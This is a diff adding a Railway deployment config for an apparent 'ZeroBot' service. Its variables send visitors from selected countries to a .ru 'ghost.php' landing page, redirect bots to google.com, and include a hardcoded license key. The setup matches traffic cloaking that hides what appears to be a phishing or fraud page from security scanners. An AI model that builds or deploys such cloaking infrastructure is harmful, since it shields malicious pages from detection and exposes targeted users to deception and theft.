@@ -1,0 +1,46 @@
+{
+  "$schema": "https://railway.app/railway.schema.json",
+  "build": {
+    "builder": "nixpacks",
+    "startCommand": "node index.js"
+  },
+  "variables": {
+    "ZEROBOT_LICENSE_KEY": {
+      "description": "Your ZeroBot license key (32 chars)",
+      "value": "9gr6jlrgbzpwz7rorkxqvejncmaixd8o"
+    },
+    "SECRET_KEY": {
+      "description": "Auto-generated secret for tokens",
+      "generator": "secret"
+    },
+    "PRIMARY_DOMAIN": {
+      "description": "Auto-set by Railway (your-app.up.railway.app)",
+      "required": false
+    },
+    "FINAL_DESTINATION": {
+      "description": "Your final landing page URL",
+      "value": "https://rep.zynvero.ru/shiro/ghost.php"
+    },
+    "ALLOWED_COUNTRIES": {
+      "description": "Comma-separated allowed countries",
+      "value": "us,au,ae,gb,ca"
+    },
+    "BOT_REDIRECT": {
+      "description": "Where to redirect bots",
+      "value": "https://google.com"
+    },
+    "ALLOWED_ORIGINS": {
+      "description": "Additional CORS domains",
+      "value": "https://rep.zynvero.ru,http://localhost:3000"
+    }
+  },
+  "checks": {
+    "healthcheck": {
+      "type": "http",
+      "path": "/health",
+      "interval": 30,
+      "timeout": 5,
+      "method": "GET"
+    }
+  }
+}
